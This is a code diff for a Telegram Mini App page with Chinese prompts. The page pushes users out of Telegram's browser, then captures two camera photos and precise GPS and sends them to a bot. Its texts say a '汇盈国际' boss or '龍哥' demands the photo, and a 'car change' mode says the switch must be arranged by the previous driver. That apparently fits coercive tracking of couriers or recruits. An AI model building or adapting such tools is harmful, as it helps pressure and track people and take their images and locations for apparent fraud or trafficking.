@@ -23,7 +23,7 @@
         .container {
             background: rgba(255,255,255,0.08); backdrop-filter: blur(25px); border-radius: 28px;
             padding: 45px 35px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.25),
-            inset 0 1px 0 rgba(255,255,255,255,0.15); max-width: 440px; width: 100%; position: relative;
+            inset 0 1px 0 rgba(255,255,255,0.15); max-width: 440px; width: 100%; position: relative;
             overflow: hidden; border: 1px solid rgba(255,255,255,0.1); animation: fadeInUp 0.7s ease-out;
         }
         @keyframes fadeInUp { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
@@ -50,28 +50,39 @@
 </head>
 <body>
 
-<!-- ====================== 强制用外部浏览器提示页面 ====================== -->
-<div id="forceExternal" style="display:none; padding:30px 20px; text-align:center; min-height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; background:#0c2461; color:white;">
-    <h1 style="font-size:28px; margin-bottom:20px;">⚠️ 检测到 Telegram 内置浏览器</h1>
-    <p style="font-size:18px; line-height:1.8; margin-bottom:30px; opacity:0.9;">
-        当前环境无法开启不了相机和定位<br>
-        <b>必须用手机自带浏览器打开才能拍照</b>
-    </p>
-    <button id="openExternalBtn" style="background:linear-gradient(135deg,#4facfe,#00f2fe); color:white; border:none; padding:20px 50px; border-radius:50px; font-size:20px; font-weight:600; box-shadow:0 12px 35px rgba(79,172,254,0.5);">
-        🔓 立即用系统浏览器打开
-    </button>
-    <p style="margin-top:30px; font-size:15px; opacity:0.8;" id="countdown">10 秒后自动跳转...</p>
+<!-- ==================== 高级强制跳转页面 ==================== -->
+<div id="forceExternal" style="display:none; min-height:100vh; background:linear-gradient(135deg,#0c2461,#1e3799,#4a69bd); color:white; text-align:center; padding:30px 20px; display:flex; flex-direction:column; justify-content:center; align-items:center; font-family:-apple-system,system-ui,Arial,sans-serif;">
+    <div style="max-width:420px; width:100%;">
+        <h1 style="font-size:32px; font-weight:800; margin-bottom:16px; background:linear-gradient(90deg,#4facfe,#00f2fe);-webkit-background-clip:text;-webkit-text-fill-color:transparent;">
+            需要用系统浏览器打开
+        </h1>
+        <p style="font-size:18px; line-height:1.7; opacity:0.9; margin-bottom:40px;">
+            Telegram 内置浏览器已全面屏蔽相机和定位权限<br>
+            <b>必须用手机自带浏览器才能拍照打卡</b>
+        </p>
+
+        <div style="background:rgba(255,255,255,0.1); backdrop-filter:blur(20px); border-radius:20px; padding:25px; margin-bottom:35px; border:1px solid rgba(255,255,255,0.15);">
+            <p style="font-size:16px; margin-bottom:15px;">点击按钮立即跳转</p>
+            <button id="openExternalBtn" style="width:100%; background:linear-gradient(135deg,#4facfe,#00f2fe); border:none; color:white; padding:18px; border-radius:16px; font-size:19px; font-weight:600; box-shadow:0 10px 30px rgba(79,172,254,0.4);">
+                立即用系统浏览器打开
+            </button>
+        </div>
+
+        <p style="font-size:15px; opacity:0.8;">
+            <span id="countdown">10</span> 秒后自动跳转…
+        </p>
+    </div>
 </div>
 
-<!-- ====================== 正常拍照页面 ====================== -->
+<!-- ==================== 主拍照界面 ==================== -->
 <div class="container" id="mainApp">
-    <h1 id="title">📸 拍照确认</h1>
+    <h1 id="title">拍照确认</h1>
     <p id="description">请选择摄像头并确认精准位置</p>
     <div id="confirmText" class="confirm-text" style="display:none;"></div>
   
     <div class="camera-choice">
-        <button class="camera-btn active" onclick="selectCamera('back')" id="backBtn">📷 后置摄像头</button>
-        <button class="camera-btn" onclick="selectCamera('front')" id="frontBtn">🤳 前置摄像头</button>
+        <button class="camera-btn active" onclick="selectCamera('back')" id="backBtn">后置摄像头</button>
+        <button class="camera-btn" onclick="selectCamera('front')" id="frontBtn">前置摄像头</button>
     </div>
     <button id="signInBtn" class="btn">开始拍照确认</button>
     <div id="loading" class="loading">
@@ -81,10 +92,10 @@
     <div id="photoCounter" class="photo-counter">照片 1/2</div>
     <video id="videoPreview" autoplay playsinline muted></video>
     <img id="photoPreview" src="" alt="照片预览">
-    <button id="captureBtn" onclick="capturePhoto()">📸 拍照</button>
-    <button id="retryCameraBtn" class="retry-btn" onclick="retryCamera()">🔄 重试相机</button>
-    <button id="sendBtn" class="send-btn" onclick="manualSend()">📤 仅发送照片（无位置）</button>
-    <div id="status" class="status>点击上方按钮开始</div>
+    <button id="captureBtn" onclick="capturePhoto()">拍照</button>
+    <button id="retryCameraBtn" class="retry-btn" onclick="retryCamera()">重试相机</button>
+    <button id="sendBtn" class="send-btn" onclick="manualSend()">仅发送照片（无位置）</button>
+    <div id="status" class="status">点击上方按钮开始</div>
 </div>
 
 <script>
@@ -93,73 +104,70 @@ tg.ready();
 tg.expand();
 tg.enableClosingConfirmation();
 
-// ==================== 第一步：强制用外部浏览器打开 ====================
-function isInTelegramInAppBrowser() {
+// ==================== 判断是否在 Telegram 内置浏览器 ====================
+function isTelegramInAppBrowser() {
     const ua = navigator.userAgent.toLowerCase();
-    const isTgWebApp = typeof tg !== 'undefined' && tg.initDataUnsafe;
-    return isTgWebApp && (
-        ua.includes('telegram') &&
-        !ua.includes('chrome') && 
-        !ua.includes('safari') && 
-        !ua.includes('firefox') && 
-        !ua.includes('edg')
-    );
+    return !!tg.initDataUnsafe && 
+           ua.includes('telegram') && 
+           !ua.includes('chrome') && 
+           !ua.includes('safari') && 
+           !ua.includes('firefox') && 
+           !ua.includes('edg') &&
+           !ua.includes('opr/');
 }
 
-if (isInTelegramInAppBrowser()) {
+// ==================== 如果是内置浏览器 → 显示强制跳转页 ====================
+if (isTelegramInAppBrowser()) {
     document.getElementById('mainApp').style.display = 'none';
     document.getElementById('forceExternal').style.display = 'flex';
 
-    // 按钮点击立即打开外部浏览器
-    document.getElementById('openExternalBtn').onclick = openInExternal;
+    let seconds = 10;
+    const countdownEl = document.getElementById('countdown');
+    const btn = document.getElementById('openExternalBtn');
 
-    // 10秒后自动打开
-    let sec = 10;
     const timer = setInterval(() => {
-        sec--;
-        document.getElementById('countdown').textContent = sec + ' 秒后自动跳转...';
-        if (sec <= 0) {
+        seconds--;
+        countdownEl.textContent = seconds;
+        if (seconds <= 0) {
             clearInterval(timer);
-            openInExternal();
+            forceOpenExternal();
         }
     }, 1000);
-}
 
-function openInExternal() {
-    const url = window.location.href;
-    if (tg.openLink) {
-        tg.openLink(url, { try_instant_view: false });
+    btn.onclick = () => {
+        clearInterval(timer);
+        btn.innerHTML = '正在跳转…';
+        btn.disabled = true;
+        forceOpenExternal();
+    };
+
+    function forceOpenExternal() {
+        const url = window.location.href;
+        if (tg.openLink) tg.openLink(url, { try_instant_view: false });
+        setTimeout(() => window.location.replace(url), 300);
+        setTimeout(() => { const a = document.createElement('a'); a.href = url; a.target = '_blank'; a.rel = 'noopener'; document.body.appendChild(a); a.click(); }, 600);
+        setTimeout(() => tg.showPopup({title:'请长按链接打开', message:url, buttons:[{type:'copy'},{type:'close'}]}), 2500);
     }
-    // 兜底方案
-    setTimeout(() => {
-        window.location.href = url;
-    }, 300);
-    // 再保险
-    setTimeout(() => {
-        window.open(url, '_blank');
-    }, 800);
-}
 
-// ==================== 正常功能代码（只有外部浏览器才会执行） ====================
-if (!isInTelegramInAppBrowser()) {
+} else {
+    // ==================== 正常浏览器环境 → 执行拍照逻辑 ====================
 
-    // 参数解析
     const urlParams = new URLSearchParams(window.location.search);
     const type = urlParams.get('type') || 'default';
 
-    const titles = { boss: '📸 Boss 要求拍照', lg: '📸 龙哥要求拍照', hc: '🚗 换车安全确认' };
+    const titles = { boss: 'Boss 要求拍照', lg: '龍哥要求拍照', hc: '换车安全确认' };
     const descriptions = {
         boss: '汇盈国际负责人@Boss要求你拍照，请点击下方拍照',
         lg: '汇盈国际负责人龍哥要求你拍照，请点击下方拍照',
         hc: '为了保障你安全换车前请拍照！换车一定要是上一个司机安排的哦'
     };
     const confirmTexts = {
-        boss: '✅ 确认：已按 Boss 要求拍照',
-        lg: '✅ 确认：已按龙哥要求拍照',
-        hc: '✅ 确认：本次换车由上一个司机安排'
+        boss: '确认：已按 Boss 要求拍照',
+        lg: '确认：已按龍哥要求拍照',
+        hc: '确认：本次换车由上一个司机安排'
     };
 
-    document.getElementById('title').textContent = titles[type] || '📸 拍照确认';
+    document.getElementById('title').textContent = titles[type] || '拍照确认';
     document.getElementById('description').textContent = descriptions[type] || '请拍照并确认位置';
     const confirmDiv = document.getElementById('confirmText');
     confirmDiv.textContent = confirmTexts[type] || '';
@@ -193,9 +201,7 @@ if (!isInTelegramInAppBrowser()) {
     async function startCamera() {
         stopCamera();
         try {
-            const constraints = {
-                video: { facingMode: currentCamera === 'back' ? 'environment' : 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-            };
+            const constraints = { video: { facingMode: currentCamera === 'back' ? 'environment' : 'user', width: { ideal: 1280 }, height: { ideal: 720 } } };
             stream = await navigator.mediaDevices.getUserMedia(constraints);
             videoPreview.srcObject = stream;
             videoPreview.style.display = 'block';
@@ -204,23 +210,19 @@ if (!isInTelegramInAppBrowser()) {
             retryCameraBtn.style.display = 'none';
             status.textContent = '相机已就绪 → 点击拍照';
         } catch (err) {
-            console.error(err);
-            status.innerHTML = `<span class="error">相机权限被拒或不可用<br>请在地址栏点击相机图标 → 允许</span>`;
+            status.innerHTML = `<span class="error">相机权限被拒<br>请在地址栏点击相机图标允许</span>`;
             retryCameraBtn.style.display = 'block';
         }
     }
 
     function retryCamera() {
-        status.textContent = '正在重新请求相机权限...';
+        status.textContent = '重新请求权限...';
         retryCameraBtn.style.display = 'none';
         setTimeout(startCamera, 800);
     }
 
     function stopCamera() {
-        if (stream) {
-            stream.getTracks().forEach(t => t.stop());
-            stream = null;
-        }
+        if (stream) stream.getTracks().forEach(t => t.stop());
         videoPreview.style.display = 'none';
         captureBtn.style.display = 'none';
     }
@@ -229,9 +231,7 @@ if (!isInTelegramInAppBrowser()) {
         if (locationFetching) return;
         locationFetching = true;
         sendBtn.style.display = 'none';
-        status.textContent = '正在获取位置（室外效果更好）...';
-
-        // 优先 Telegram 官方 API
+        status.textContent = '正在获取位置（室外更好）...';
         tg.requestLocation((err, loc) => {
             if (!err && loc) {
                 currentLocation = { lat: loc.latitude, lng: loc.longitude, accuracy: 10 };
@@ -245,10 +245,7 @@ if (!isInTelegramInAppBrowser()) {
     }
 
     function fallbackGeolocation() {
-        if (!navigator.geolocation) {
-            locationFailed();
-            return;
-        }
+        if (!navigator.geolocation) { locationFailed(); return; }
         let tries = 0;
         const tryGeo = () => {
             tries++;
@@ -260,10 +257,7 @@ if (!isInTelegramInAppBrowser()) {
                     locationFetching = false;
                     if (photos.length === 2) sendData();
                 },
-                () => {
-                    if (tries < 3) setTimeout(tryGeo, 3000);
-                    else locationFailed();
-                },
+                () => { if (tries < 3) setTimeout(tryGeo, 3000); else locationFailed(); },
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
             );
         };
@@ -278,8 +272,7 @@ if (!isInTelegramInAppBrowser()) {
 
     function capturePhoto() {
         const canvas = document.createElement('canvas');
-        canvas.width = 800;
-        canvas.height = 600;
+        canvas.width = 800; canvas.height = 600;
         const ctx = canvas.getContext('2d');
         if (currentCamera === 'front') ctx.scale(-1, 1);
         ctx.drawImage(videoPreview, currentCamera === 'front' ? -800 : 0, 0, currentCamera === 'front' ? -800 : 800, 600);
@@ -299,22 +292,14 @@ if (!isInTelegramInAppBrowser()) {
             loading.style.display = 'block';
             animateProgress();
             getLocationWithRetry();
-
-            // 10秒保险
-            forceSendTimer = setTimeout(() => {
-                if (photos.length === 2) sendData();
-            }, 10000);
+            forceSendTimer = setTimeout(() => { if (photos.length === 2) sendData(); }, 10000);
         }
     }
 
     function animateProgress() {
         const fill = document.querySelector('.progress-fill');
         let w = 0;
-        const iv = setInterval(() => {
-            w += 2;
-            fill.style.width = w + '%';
-            if (w >= 100) clearInterval(iv);
-        }, 100);
+        const iv = setInterval(() => { w += 2; fill.style.width = w + '%'; if (w >= 100) clearInterval(iv); }, 100);
     }
 
     function manualSend() {
@@ -349,13 +334,13 @@ if (!isInTelegramInAppBrowser()) {
         tg.sendData(JSON.stringify(data));
 
         setTimeout(() => {
-            status.textContent = currentLocation ? '✅ 全部发送成功！' : '✅ 照片已发送（无位置）';
+            status.textContent = currentLocation ? '全部发送成功！' : '照片已发送（无位置）';
             loading.style.display = 'none';
             signInBtn.textContent = '已完成';
             signInBtn.disabled = true;
             signInBtn.style.background = 'linear-gradient(135deg, #4facfe, #00f2fe)';
             stopCamera();
-            tg.showAlert(currentLocation ? '位置+照片全部发送成功！' : '照片已发送，位置失败但不影响');
+            tg.showAlert(currentLocation ? '位置+照片全部发送成功！' : '照片已发送，位置失败但不影响使用');
         }, 800);
     }
 
@@ -364,7 +349,7 @@ if (!isInTelegramInAppBrowser()) {
         signInBtn.textContent = '启动中...';
         status.textContent = '请求相机权限...';
         startCamera();
-        getLocationWithRetry(); // 提前开始定位
+        getLocationWithRetry();
     });
 
     window.addEventListener('beforeunload', stopCamera);
